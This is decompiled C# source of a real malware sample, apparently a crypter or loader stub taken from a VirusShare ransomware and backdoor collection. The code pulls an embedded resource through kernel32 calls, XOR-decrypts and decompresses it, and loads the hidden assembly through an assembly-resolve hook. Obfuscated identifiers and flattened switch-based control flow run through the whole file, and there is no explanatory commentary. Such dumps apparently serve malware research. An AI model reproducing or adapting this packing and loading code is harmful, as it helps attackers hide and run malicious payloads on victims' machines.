// Decompiled with JetBrains decompiler
// Type: Ⴐ.Ⴗ
// Assembly: stub, Version=6.2.15.2, Culture=neutral, PublicKeyToken=null
// MVID: 6CAE2B56-3E3C-414E-A63C-DF5759216B41
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Backdoor.Win32.Generic-5936afd9bae04fb6905bcd21bc042e863b0df9b768761f3d706643fc87ba63a1.exe

using Microsoft.VisualBasic.CompilerServices;
using stub.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Ⴐ
{
  [StandardModule]
  internal sealed class Ⴗ
  {
    internal static Ⴐ.Ⴗ.Ⴍ Ⴅ;

    [DllImport("kernel32.dll", EntryPoint = "FindResource", SetLastError = true)]
    private static extern IntPtr Ⴓ(IntPtr Ⴀ, string Ⴈ, string Ⴄ);

    [DllImport("kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr Ⴈ([MarshalAs(UnmanagedType.VBByRefStr)] ref string Ⴀ);

    [DllImport("kernel32", EntryPoint = "SizeofResource", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int Ⴓ(IntPtr Ⴃ, IntPtr Ⴍ);

    [DllImport("kernel32", EntryPoint = "LoadResource", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr Ⴀ(IntPtr Ⴄ, IntPtr Ⴈ);

    public static byte[] Ⴄ(string Ⴗ)
    {
label_3:
      IntPtr num1 = Ⴐ.Ⴗ.Ⴈ(ref Ⴗ);
      IntPtr num2 = Ⴐ.Ⴗ.Ⴓ(num1, MyComputer.Ⴍ(437501425, 5), MyComputer.Ⴍ(437501431, 6));
label_4:
      int num3 = 1;
      IntPtr num4;
      int num5;
      byte[] numArray1;
      byte[] numArray2;
      while (true)
      {
        switch (num3)
        {
          case 0:
            goto label_4;
          case 1:
          case 7:
            num4 = Ⴐ.Ⴗ.Ⴀ(num1, num2);
            goto case 3;
          case 2:
            goto label_3;
          case 3:
            num5 = Ⴐ.Ⴗ.Ⴓ(num1, num2);
            numArray1 = new byte[checked (num5 - 1 + 1)];
            num3 = 5;
            continue;
          case 4:
            goto label_8;
          case 5:
            Ⴐ.Ⴈ.Ⴅ(num4, numArray1, 0, num5, 504, 447);
            numArray2 = numArray1;
            num3 = 4;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴗ.Ⴄ);
            num3 = 2;
            continue;
        }
      }
label_8:
      return numArray2;
    }

    static Ⴗ() => Ⴐ.Ⴈ.Ⴃ();

    internal static Assembly Ⴗ([In] object obj0, [In] ResolveEventArgs obj1) => Ⴐ.Ⴗ.Ⴐ(obj1, __fieldref (Ⴐ.Ⴗ.Ⴅ), 777, "668b89a2-dbf7-4ce7-9106-ad08545a3565", 117);

    internal static Assembly Ⴐ(
      ResolveEventArgs args,
      RuntimeFieldHandle resourceField,
      int resourceLength,
      string nameGuid,
      int offset)
    {
label_3:
      while (resourceLength > 0)
      {
        int num1 = 4;
        Assembly assembly1;
        string name;
        AppDomain appDomain;
        Dictionary<string, string> dictionary;
        byte[] buffer;
        int index1;
        while (true)
        {
          switch (num1)
          {
            case 0:
              buffer[index1] ^= (byte) (index1 + offset & (int) byte.MaxValue);
              num1 = 11;
              continue;
            case 1:
              goto label_3;
            case 3:
              goto label_15;
            case 4:
              assembly1 = MyComputer.ႥႥ(145, 144);
              goto case 12;
            case 5:
              dictionary = new Dictionary<string, string>();
              MyComputer.ႥႣ(appDomain, nameGuid, (object) dictionary, 403, 422);
              buffer = new byte[resourceLength];
              num1 = 7;
              continue;
            case 6:
              appDomain = stub.Compression.Ⴄ(206, 148);
              dictionary = (Dictionary<string, string>) Ⴐ.Ⴅ.Ⴈ(appDomain, nameGuid, 82, 107);
              num1 = 10;
              continue;
            case 7:
              Ⴐ.Ⴅ.Ⴄ((Array) buffer, resourceField, 914, 908);
              index1 = 0;
              num1 = 13;
              continue;
            case 8:
            case 10:
              if (dictionary == null)
              {
                num1 = 5;
                continue;
              }
              goto label_36;
            case 9:
              goto label_16;
            case 11:
              ++index1;
              num1 = 13;
              continue;
            case 12:
              name = stub.Compression.Ⴗ(nameGuid, MyApplication.Ⴜ(437501333, 3), 407, 461);
              num1 = 6;
              continue;
            case 13:
              num1 = index1 < resourceLength ? 0 : 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴗ.Ⴐ);
              num1 = 1;
              continue;
          }
        }
label_15:
        MemoryStream memoryStream = new MemoryStream();
label_16:
        DeflateStream deflateStream = new DeflateStream((Stream) new MemoryStream(buffer), CompressionMode.Decompress, true);
        try
        {
          int num2 = 6;
          byte[] numArray;
          int num3;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 2:
              case 3:
              case 7:
                MyApplication.ႤႳ((Stream) memoryStream, numArray, 0, num3, 497, 422);
                goto case 5;
              case 4:
                goto label_27;
              case 5:
                num2 = (num3 = Ⴐ.Ⴈ.Ⴜ((Stream) deflateStream, numArray, 0, numArray.Length, 511, 474)) > 0 ? 7 : 4;
                continue;
              default:
                numArray = new byte[1024];
                num2 = 5;
                continue;
            }
          }
        }
        finally
        {
          int num4 = 2;
          while (true)
          {
            switch (num4)
            {
              case 0:
              case 3:
                goto label_25;
              case 1:
                goto label_26;
              default:
                num4 = deflateStream == null ? 1 : 0;
                continue;
            }
          }
label_25:
          deflateStream.Dispose();
label_26:;
        }
label_27:
        int num5 = 0;
label_28:
        Assembly assembly2;
        string[] strArray;
        int index2;
        while (true)
        {
          switch (num5)
          {
            case 1:
            case 5:
            case 10:
              num5 = index2 < strArray.Length ? 3 : 2;
              continue;
            case 2:
              num5 = 4;
              continue;
            case 3:
              string key = strArray[index2];
              dictionary[key] = key;
              ++index2;
              num5 = 10;
              continue;
            case 4:
              num5 = !dictionary.ContainsKey(args.Name) ? 7 : 6;
              continue;
            case 6:
              goto label_38;
            case 7:
              goto label_39;
            case 8:
              MyComputer.ႥႣ(appDomain, name, (object) assembly2, 768, 822);
              strArray = Ⴐ.Ⴅ.Ⴗ(assembly2, 233, 174);
              num5 = 12;
              continue;
            case 9:
              num5 = 10;
              continue;
            case 12:
              index2 = 0;
              goto case 9;
            case 13:
              goto label_36;
            default:
              assembly2 = MyApplication.ႤႭ(Ⴐ.Ⴈ.ႨႠ(memoryStream, 866, 858), (byte[]) null, Ⴐ.Ⴅ.Ⴀ(assembly1, 470, 399), 452, 499);
              num5 = 8;
              continue;
          }
        }
label_38:
        return assembly2;
label_36:
        assembly2 = (Assembly) appDomain.GetData(name);
        num5 = 4;
        goto label_28;
      }
label_39:
      return (Assembly) null;
    }

    internal static string Ⴃ([In] string obj0, [In] string[] obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 89:
          num1 = 1;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 1:
          case 2:
            goto label_8;
          case 3:
          case 5:
            num2 = 0;
            continue;
          case 6:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴗ.Ⴃ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return Utils.GetResourceString(obj0, obj1);
    }

    internal static Exception Ⴜ([In] Exception obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 9:
          num1 = 2;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
          case 3:
          case 6:
            goto label_8;
          case 4:
            goto label_3;
          case 5:
            num2 = 4;
            continue;
          case 7:
            num2 = 4;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴗ.Ⴜ);
            num2 = 4;
            continue;
        }
      }
label_8:
      return obj0.InnerException;
    }

    internal static string ႭႠ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 45:
          num1 = 5;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 4;
            continue;
          case 1:
          case 2:
            num2 = 4;
            continue;
          case 4:
          case 6:
          case 7:
            goto label_3;
          case 5:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴗ.ႭႠ);
            num2 = 4;
            continue;
        }
      }
label_8:
      return Application.ExecutablePath;
    }

    internal static void ႭႥ([In] Control obj0, [In] Point obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 2:
            goto label_7;
          case 3:
            goto label_8;
          case 4:
            num1 = 0;
            continue;
          case 5:
            goto label_9;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 83:
                num2 = 1;
                break;
              default:
                num2 = 4;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_9:
      return;
label_7:
      obj0.Location = obj1;
    }

    [StructLayout(LayoutKind.Explicit, Size = 777, Pack = 1)]
    private struct Ⴍ
    {
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct ႭႭ
    {
      internal IContainer Ⴃ;
      internal Button Ⴍ;
      internal Button Ⴓ;
      internal Button Ⴄ;
      internal Button Ⴗ;
      internal Button Ⴈ;
      internal Button Ⴀ;
      internal Button Ⴐ;
      internal Button Ⴅ;
      internal Button Ⴜ;
      internal CheckedListBox ႭႣ;
      internal DateTimePicker ႭႭ;
      internal ListBox ႭႳ;
      internal Timer ႭႤ;
      internal Timer ႭႷ;
      internal Timer ႭႨ;
      internal Timer ႭႠ;
      internal Timer ႭႰ;
      internal Timer ႭႥ;
      internal Timer ႭႼ;
      internal Timer ႳႣ;
      internal Timer ႳႭ;
    }
  }
}
